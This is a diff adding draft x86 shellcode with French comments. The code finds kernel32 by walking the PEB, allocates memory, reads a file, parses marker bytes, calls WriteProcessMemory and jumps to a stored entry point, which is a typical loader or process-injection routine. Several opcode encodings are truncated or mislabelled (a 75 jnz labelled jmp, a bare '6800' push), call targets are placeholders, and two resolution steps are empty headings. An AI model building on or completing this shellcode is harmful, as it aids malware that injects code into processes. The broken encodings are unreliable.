@@ -1,0 +1,61 @@
+56		push esi
+33C0		xor eax,eax
+648B4030	mov eax,fs:[eax+0x30]
+8B400C		mov eax,dword ptr ds:[eax+C]
+8B701C		mov esi,dword ptr ds:[eax+1C]
+ad		lods dword ptr ds:[esi] (olly) // lodsd (doc)
+8B4008		mov eax,dword ptr ds:[eax+8]
+5E		pop esi
+	 II/ récup adresse GetProcAddress
+	 III/ récup autres adresses
+6A04       push PAGE_READWRITE
+6800200000 push MEM_RESERVE
+6850010000 push 150
+6800       push NULL
+e8[VA]     call VirtualAlloc
+6a00	   push NULL
+6800000000 push FILE_ATTRIBUTE_NORMAL
+6a03	   push OPEN_EXISTING
+6a00	   push NULL
+6a01	   push FILE_SHARE_READ
+6880000000 push GENERIC_READ
+	   push dword ptr [adresse filename]
+e8[CF]	   call CreateFile
+8bd8	   mov  ebx, eax
+53	   push ebx
+6800       push NULL
+50	   push eax
+e8[GFZ]	   call GetFileSize
+5b	   pop ebx
+6800       push NULL
+	   push dword ptr [nbFileRead]
+50	   push eax
+	   push dword ptr [page_allouée]
+53	   push ebx
+e8[RF]	   call ReadFile
+[CCC]:
+ac         lodsb [AAA]
+3c5a       cmp al, 5ah ;5a code ascii Z
+75[AAA]    jnz [AAA]   
+3c59       cmp al, 59h ;59 code ascii Y
+75[BBB]	   jnz [BBB]
+3c00	   cmp al, NULL
+75[DDD]    jmp [DDD]
+[AAA]:
+8bf7       mov esi, edi
+ad         lodsd
+50         push eax 
+46         inc esi
+56         push esi
+8bfe       mov edi, esi
+eb[CCC]    jmp [CCC]
+[BBB]:
+8bc6       mov eax, esi
+48	   dec eax
+2bc7	   sub eax, edi
+50	   push eax
+e8[WPM]    call WriteProcessMemory
+eb[CCC]    jmp [CCC]
+[DDD]:
+	   mov eax, dword ptr [EPbase]
+ffe0	   jmp eax
